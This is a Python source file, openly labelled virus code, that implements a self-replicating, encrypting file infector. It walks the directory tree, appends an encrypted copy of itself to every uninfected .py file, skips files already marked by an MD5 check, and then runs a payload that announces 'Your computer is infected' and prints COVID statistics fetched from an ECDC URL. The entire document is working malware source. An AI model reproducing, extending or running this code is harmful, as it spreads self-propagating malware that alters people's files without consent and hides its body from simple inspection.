# starting virus code
import base64
import codecs
import csv
import datetime
import hashlib
import os
import re
import string
import sys
import time
from urllib.request import urlopen

virusCode = []
virusCode1 = []
virusCode2 = []
virusFile = open(__file__, "r")
lines = virusFile.readlines()
virusFile.close()
maxLine = 0

abc = string.digits + string.ascii_letters + string.punctuation
one_time_pad = list(abc)
wiii = string.whitespace


def partialize(inp, filterIn):
    index = 0
    found = False
    for line in inp:
        if re.search(filterIn, line):
            found = True
            break
        index += 1

    if found:
        return index
    else:
        return -1


def decryptLine(lineCipherText, keyStr):
    plaintext = []

    for idx, char in enumerate(lineCipherText):
        if char in wiii:
            plaintext += char
            continue
        charIdx = abc.index(char)
        keyIdx = one_time_pad.index(keyStr[idx])
        plain = (charIdx - keyIdx) % len(one_time_pad)
        plaintext += abc[plain]

    return plaintext


index_partial = partialize(lines, '^r"""')
virusPart_start = partialize(lines, '^# starting virus code')
# it provides avoiding irrelevant copy of descendant viruses
if index_partial != -1:
    virusCode1 = lines[virusPart_start:index_partial - 1]
    virusCode2 = lines[index_partial:]
    virusCode2 = virusCode2[:-1]
    virusCode2[0] = virusCode2[0][4:]
    virusCode2[-1] = virusCode2[-1][-3]
    output = []
    keysend = lines[-1]
    keysend = keysend.strip()
    keysend = keysend[1:]
    for yy in virusCode2:
        tmpp = ""
        output.append(tmpp.join(decryptLine(yy, keysend)))
    result = []
    for ll in output:
        result.extend(ll)
    result = result[:-1]
    strResult = ""
    strResult = strResult.join(result)
    exec(strResult)
    sys.exit(0)

else:
    index_partial = partialize(lines, '^# secondpart')
    virusCode1 = lines[:index_partial - 1]
    virusCode2 = lines[index_partial:]
    # ending decrypted virus code


# secondpart

def findMaxLine():
    global maxLine
    for line in lines:
        tmp = len(line)
        if tmp > maxLine:
            maxLine = tmp


findMaxLine()


# put virus code into the code
def takeVirusCode():
    inVirus = False
    for line in lines:
        if re.search('^# starting virus code', line):
            inVirus = True

        if inVirus:
            virusCode.append(line)
        if re.search('^payload()', line):
            break


def createKey():
    findMaxLine()
    #print(maxLine)
    return base64.b64encode(os.urandom(maxLine))


def encryptLine(vline, keyStr):
    vline = vline.encode('ascii')
    # print(vline)
    ciphertextNew = []
    for idx, char in enumerate(vline):
        if chr(char) in wiii:
            ciphertextNew += chr(char)
            continue
        charIdx = abc.index(chr(char))
        # print(charIdx)
        keyIdx = one_time_pad.index(keyStr[idx])
        # print(keyIdx)
        cipher = (keyIdx + charIdx) % len(one_time_pad)
        # print(abc[cipher])
        ciphertextNew += abc[cipher]
    return ciphertextNew


def infect():
    global virusCode2
    extensions = '.py'
    matches = []
    for root, dirnames, filenames in os.walk("."):
        for filename in filenames:
            if filename.endswith(extensions):
                if filename == __file__:
                    continue
                else:
                    matches.append(os.path.join(root, filename))

    for p in matches:
        file = open(p, "r")
        programCode = file.readlines()
        file.close()

        # check whether file is infected or not

        decPartstart = 0
        decPartend = 0
        index_decPart = 0
        for line in programCode:
            if re.search("^import base64", line):
                decPartstart = index_decPart
            elif re.search("^    # ending decrypted virus code", line):
                decPartend = index_decPart
            else:
                pass
            index_decPart += 1

        hashOutput = "".join(programCode[decPartstart:decPartend]).encode('utf-8')
        hashOutput = hashlib.md5(hashOutput).hexdigest()
        infected = False
        #print(str(hashOutput).rstrip())
        if str(hashOutput) == "36a4907921ae3e8bd35c03491c23a223":
            infected = True
            # we dont need to infect this again

        if not infected:
            hiddenVirusCode = []
            for xx in virusCode1:
                hiddenVirusCode.append(xx)

            hiddenVirusCode.append(['r"""'])

            index_i = 0
            key = createKey()

            keyStr = str(key)
            keyStr = keyStr.strip()
            keyStr = keyStr[2:-1]

            testEncrypted = partialize(lines, 'hiddenVirusCode')
            if testEncrypted == -1:
                keyNow = lines[-1]
                keyNow = keyNow[1:]

                newVirusCode2 = []
                out = ""
                newVirusCode2 = [""]
                for pp in virusCode2:
                    #print(pp)
                    if pp == ["\n"] or pp == "\n":
                        out = pp
                    else:
                        out = decryptLine(pp, keyNow)
                    newVirusCode2.append("".join(out))
                virusCode2.clear()
                virusCode2 = newVirusCode2
                #print(newVirusCode2)
            for yy in virusCode2:
                if yy == ["\n"] or yy == "\n":
                    hiddenVirusCode.append(yy)
                else:
                    hiddenVirusCode.append(encryptLine(yy, keyStr))
                index_i += 1
            hiddenVirusCode[-1].extend(['"""'])

            file = open(p, "w")

            for lineDec in programCode:
                file.write(lineDec)
            file.writelines("\n")
            for elem in hiddenVirusCode:
                if elem is None:
                    continue
                else:
                    file.writelines(elem)

            file.writelines("\n#" + keyStr)
            file.close()


def getCovid(crIn):
    today = datetime.datetime.now()
    todayStr = today.strftime("%d/%m/%Y")
    yesterday = today - datetime.timedelta(days=1)
    yesterdayStr = yesterday.strftime("%d/%m/%Y")
    covidResult = []
    for row in crIn:
        if (todayStr in row) or (yesterdayStr in row):
            covidResult.append(
                row[6] + "-->           New cases: " + row[4] + "           Deaths: " + row[5] + "           Date: " +
                row[0])

    return covidResult


def payload():
    print("Your computer is infected\n")
    time.sleep(3)
    print("People are dying...\n")
    time.sleep(3)
    print("Be patient and stay at home!\n")
    time.sleep(3)
    print("I will show you results from all over the world today...\n")
    time.sleep(1)
    print("Loading last casualities...\n")
    time.sleep(2)
    url = 'https://opendata.ecdc.europa.eu/covid19/casedistribution/csv'
    response = urlopen(url)

    cr = csv.reader(codecs.iterdecode(response, 'utf-8'))

    casualities = getCovid(cr)

    for elem in casualities:
        print(elem)


infect()
payload()
